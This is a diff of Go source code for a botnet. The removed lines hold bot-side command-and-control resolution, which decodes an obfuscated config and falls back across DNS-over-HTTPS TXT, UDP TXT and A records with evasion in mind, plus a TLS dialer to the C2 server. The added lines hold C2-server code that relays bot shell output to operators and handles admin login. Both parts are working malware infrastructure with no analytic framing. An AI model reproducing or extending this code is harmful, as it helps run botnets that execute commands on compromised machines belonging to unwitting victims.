-	deoxys("rayquaza: System resolver failed: %v, trying DoH", err)
-
-	// Fallback to DoH A record
-	dohServers := []string{
-		"https://cloudflare-dns.com/dns-query",
-		"https://dns.google/dns-query",
-	}
-	for _, server := range dohServers {
-		dohURL := fmt.Sprintf("%s?name=%s&type=A", server, domain)
-		deoxys("rayquaza: Trying DoH A record: %s", dohURL)
-		req, err := http.NewRequest("GET", dohURL, nil)
-		if err != nil {
 			continue
 		}
-		req.Header.Set("Accept", "application/dns-json")
-		client := &http.Client{Timeout: 10 * time.Second}
-		resp, err := client.Do(req)
-		if err != nil {
-			deoxys("rayquaza: DoH error: %v", err)
-			continue
-		}
-		if resp.StatusCode != http.StatusOK {
-			resp.Body.Close()
-			continue
-		}
-		var dnsResp struct {
-			Answer []struct {
-				Type int    `json:"type"`
-				Data string `json:"data"`
-			} `json:"Answer"`
-		}
-		if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
-			resp.Body.Close()
-			continue
-		}
-		resp.Body.Close()
-		for _, ans := range dnsResp.Answer {
-			// A records are type 1
-			if ans.Type == 1 {
-				deoxys("rayquaza: Found A record: %s", ans.Data)
-				return ans.Data, nil
-			}
-		}
-	}
-	return "", fmt.Errorf("A record lookup failed")
-}
 
-// arceus validates a hostname string according to RFC 1123 rules.
-// Checks: length (1-253 chars), valid characters (alphanumeric, hyphen, dot).
-// Parameters:
-//   - h: Hostname string to validate
-//
-// Returns: true if valid hostname, false otherwise
-func arceus(h string) bool {
-	if len(h) == 0 || len(h) > 253 {
-		return false
-	}
-	for _, c := range h {
-		if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
-			(c >= '0' && c <= '9') || c == '-' || c == '.') {
-			return false
+		// Handle other bot messages
+		logMsg("[BOT-%s] %s", botID, line)
+
+		// Check if we should forward this to a user
+		originLock.RLock()
+		userConn, hasUser := commandOrigin[botID]
+		originLock.RUnlock()
+
+		if hasUser && userConn != nil {
+			// Send message to user
+			userConn.Write([]byte(fmt.Sprintf("[Bot: %s] %s\r\n", botID, line)))
+
+			// Clear the origin after sending response
+			originLock.Lock()
+			delete(commandOrigin, botID)
+			originLock.Unlock()
 		}
 	}
-	return true
-}
-
-// dialga is the main C2 address resolver that orchestrates all resolution methods.
-// Resolution priority:
-//  1. Check if config is already IP:PORT format (direct connection)
-//  2. DNS TXT record lookup via DoH (palkia) - encrypted, harder to detect
-//  3. DNS TXT record lookup via UDP (darkrai) - fallback if DoH blocked
-//  4. DNS A record fallback (rayquaza)
-//  5. Return raw decoded value as last resort
-//
-// Returns: C2 address in "IP:PORT" format, or empty string on total failure
-func dialga() string {
-	deoxys("dialga: Starting C2 resolution")
-	decoded := venusaur(gothTits)
-	deoxys("dialga: Decoded config: '%s'", decoded)
-	if decoded == "" {
-		deoxys("dialga: Failed to decode config, returning empty")
-		return ""
-	}
-	// Check if already IP:port format
-	if strings.Contains(decoded, ":") {
-		parts := strings.Split(decoded, ":")
-		if len(parts) == 2 && net.ParseIP(parts[0]) != nil {
-			deoxys("dialga: Config is already IP:port format: %s", decoded)
-			return decoded
-		}
-	}
-	// Extract domain and port
-	domain := decoded
-	defaultPort := "443"
-	if strings.Contains(domain, ":") {
-		parts := strings.Split(domain, ":")
-		domain = parts[0]
-		if len(parts) > 1 {
-			defaultPort = parts[1]
-		}
-	}
-	deoxys("dialga: Domain=%s, Port=%s", domain, defaultPort)
-
-	// Method 1: DoH TXT record lookup (encrypted, harder to detect/block)
-	deoxys("dialga: Trying TXT record lookup via DoH")
-	if c2Addr, err := palkia(domain); err == nil && c2Addr != "" {
-		deoxys("dialga: DoH TXT lookup success: %s", c2Addr)
-		return c2Addr
-	}
-
-	// Method 2: DNS TXT record lookup (fallback if DoH blocked)
-	deoxys("dialga: Trying TXT record lookup via UDP DNS")
-	if c2Addr, err := darkrai(domain); err == nil && c2Addr != "" {
-		deoxys("dialga: TXT lookup success: %s", c2Addr)
-		return c2Addr
-	}
-
-	// Method 3: Fallback to A record (domain points directly to C2)
-	deoxys("dialga: TXT lookups failed, falling back to A record")
-	if ip, err := rayquaza(domain); err == nil && ip != "" {
-		result := fmt.Sprintf("%s:%s", ip, defaultPort)
-		deoxys("dialga: A record fallback success: %s", result)
-		return result
-	}
-
-	// Last resort: return decoded value as-is
-	deoxys("dialga: All resolution methods failed, returning decoded: %s", decoded)
-	return decoded
 }
 
 // ============================================================================
-// C2 CONNECTION FUNCTIONS
+// CONNECTION I/O UTILITIES
+// Helper functions for reading user input from network connections.
+// Handle line-based text protocols (Telnet-style) with newline trimming.
 // ============================================================================
 
-// scarcruft parses a C2 address string into host and port components.
-// Handles various URL formats by stripping protocol prefixes.
-// Parameters:
-//   - address: C2 address in various formats (tcp://, http://, https://, or raw)
-//
-// Returns: host string, port string, or error if format invalid
-func scarcruft(address string) (string, string, error) {
-	address = strings.TrimSpace(address)
-	address = strings.TrimPrefix(address, "tcp://")
-	address = strings.TrimPrefix(address, "http://")
-	address = strings.TrimPrefix(address, "https://")
-	parts := strings.Split(address, ":")
-	if len(parts) != 2 {
-		return "", "", fmt.Errorf("invalid address")
-	}
-	return parts[0], parts[1], nil
-}
-
-// gamaredon establishes a TLS connection to the C2 server.
-// Uses TLS 1.2+ with InsecureSkipVerify (self-signed certs are common for C2).
-// Implements proper timeout handling for both TCP dial and TLS handshake.
-// Parameters:
-//   - host: C2 server hostname or IP
-//   - port: C2 server port (typically 443)
-//
-// Returns: TLS connection or error
-func gamaredon(host, port string) (net.Conn, error) {
-	deoxys("gamaredon: Attempting TLS connection to %s:%s", host, port)
-	tlsConfig := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
-	dialer := &net.Dialer{Timeout: 30 * time.Second}
-	deoxys("gamaredon: Dialing TCP...")
-	rawConn, err := dialer.Dial("tcp", net.JoinHostPort(host, port))
+// getFromConn reads a single line from a network connection (creates new reader)
+// Reads until newline delimiter (Telnet-style line input)
+// Strips trailing \n and \r for clean string processing
+// Creates a new bufio.Reader each call - use getFromConnReader for reuse
+func getFromConn(conn net.Conn) (string, error) {
+	readString, err := bufio.NewReader(conn).ReadString('\n')
 	if err != nil {
-		deoxys("gamaredon: TCP dial failed: %v", err)
-		return nil, err
+		return readString, err
 	}
-	deoxys("gamaredon: TCP connected, starting TLS handshake...")
-	tlsConn := tls.Client(rawConn, tlsConfig)
-	tlsConn.SetDeadline(time.Now().Add(30 * time.Second))
-	if err := tlsConn.Handshake(); err != nil {
-		deoxys("gamaredon: TLS handshake failed: %v", err)
-		tlsConn.Close()
-		return nil, err
+	readString = strings.TrimSuffix(readString, "\n")
+	readString = strings.TrimSuffix(readString, "\r")
+	return readString, nil
+}
+
+// getFromConnReader reads a single line using existing bufio.Reader
+// More efficient than getFromConn - reuses reader buffer across reads
+// Used in user session loops where multiple inputs are expected
+// Strips trailing newlines for clean command parsing
+func getFromConnReader(reader *bufio.Reader) (string, error) {
+	readString, err := reader.ReadString('\n')
+	if err != nil {
+		return readString, err
 	}
-	deoxys("gamaredon: TLS handshake successful, cipher: %s", tls.CipherSuiteName(tlsConn.ConnectionState().CipherSuite))
-	tlsConn.SetDeadline(time.Time{})
-	return tlsConn, nil
+	readString = strings.TrimSuffix(readString, "\n")
+	readString = strings.TrimSuffix(readString, "\r")
+	return readString, nil
+}
+
+// forwardBotResponseToUser sends shell command output to the user who requested it
+// Formats the output with ANSI colors for visual clarity in terminal
+// Includes the bot ID so users know which bot generated the response
+// Wraps output in decorative borders for easy reading
+// Handles edge case of output not ending with newline
+func forwardBotResponseToUser(botID, response string, userConn net.Conn) {
+	if response == "" {
+		return
+	}
+
+	// Send formatted output with colored header and borders
+	userConn.Write([]byte(fmt.Sprintf("\033[1;36m[Bot: %s] Shell Output:\r\n", botID)))
+	userConn.Write([]byte("\033[1;33m══════════════════════════════════════════════════════════\r\n"))
+	userConn.Write([]byte("\033[0m")) // Reset color for actual output
+	userConn.Write([]byte(response))
+	if !strings.HasSuffix(response, "\n") {
+		userConn.Write([]byte("\r\n"))
+	}
+	userConn.Write([]byte("\033[1;33m══════════════════════════════════════════════════════════\r\n"))
+	userConn.Write([]byte("\033[0m")) // Reset color after output
+}
+
+// authUser handles the login prompt and credential verification for admin users
+// Allows up to 3 login attempts before disconnecting (brute force protection)
+// Prompts for username and password with styled colored prompts
+// Password field uses white-on-white text (hidden) for privacy
+// On success, creates client struct and adds to active clients list
+// Returns (true, client) on success, (false, nil) on failure
+func authUser(conn net.Conn, reader *bufio.Reader) (bool, *client) {
+
+	for i := 0; i < 3; i++ { // 3 attempts max
+		// Render login banner using ui.go function
+		RenderLoginBanner(conn)
+
+		// Attempt counter
+		if i > 0 {
+			RenderAttemptCounter(conn, i)
+		}
+
+		// Input prompts
+		RenderInputBox(conn)
+		RenderUserPrompt(conn)
+
+		username, err := getFromConnReader(reader)
+		if err != nil {
+			return false, nil
+		}
+
+		RenderPasswordPrompt(conn)
+
+		password, err := getFromConnReader(reader)
+		if err != nil {
+			return false, nil
+		}
+
+		RenderInputBoxClose(conn)
+
+		// Authentication animation
+		RenderAuthAnimation(conn)
+
+		if exists, user := AuthUser(username, password); exists {
+			RenderAccessGranted(conn)
+			conn.Write([]byte(ClearScreen))
+
+			loggedClient := &client{
+				conn: conn,
+				user: *user,
+			}
+			clients = append(clients, loggedClient)
+			return true, loggedClient
+		}
+
+		RenderAccessDenied(conn)
+	}
+
+	// Final lockout message
+	RenderLockout(conn)
+	conn.Close()
+	return false, nil
 }
